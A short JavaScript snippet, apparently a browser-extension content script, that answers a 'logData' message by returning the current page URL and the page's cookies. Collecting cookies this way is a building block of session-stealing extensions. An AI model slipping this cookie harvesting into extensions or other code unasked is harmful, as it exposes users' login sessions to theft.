chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === "logData") {
    sendResponse({
      url: window.location.href,
      cookies: document.cookie,
    });
  }
});
